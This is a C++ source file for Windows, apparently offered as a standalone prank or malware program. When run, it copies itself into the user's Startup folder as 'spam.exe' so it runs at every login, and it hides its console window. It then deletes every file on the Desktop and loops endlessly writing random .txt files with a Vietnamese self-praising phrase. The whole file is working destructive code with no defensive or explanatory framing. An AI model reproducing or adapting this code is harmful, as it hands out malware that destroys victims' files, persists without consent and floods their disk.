#include <iostream>
#include <fstream>
#include <cstdlib>
#include <ctime>
#include <windows.h>
#include <dirent.h>
#include <cstdio>
#include <fstream>
using namespace std;

string username = getenv("username");
string startup = "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";

int main(int argc, char **argv)
{
    string cpfile = startup + "\\" + "spam.exe";
    ifstream tf(argv[0], ios::binary);
    ofstream sf(cpfile, ios::binary);
    sf << tf.rdbuf();
    tf.close();
    sf.close();
    HWND Console = GetConsoleWindow();
    ShowWindow(Console, SW_HIDE);
    string userprofile = getenv("userprofile");
    string desktop = userprofile + "\\Desktop";
    DIR *dir = opendir(desktop.c_str());
    dirent *entry;
    for (int i = 0; (entry = readdir(dir)); i++)
    {
        string fname = desktop + "\\" + entry->d_name;
        cout << fname << endl;
        remove(fname.c_str());
    }
    while (true)
    {
        srand(time(0));
        string file = to_string(rand()) + ".txt";
        string path = desktop + "\\" + file;
        ofstream output;
        output.open(path, ios::out);
        if (!output.is_open()) exit(1);
        output << "Nguyễn Thái Bảo đẹp trai vl luôn";
        output.close();
    }
    return 0;
}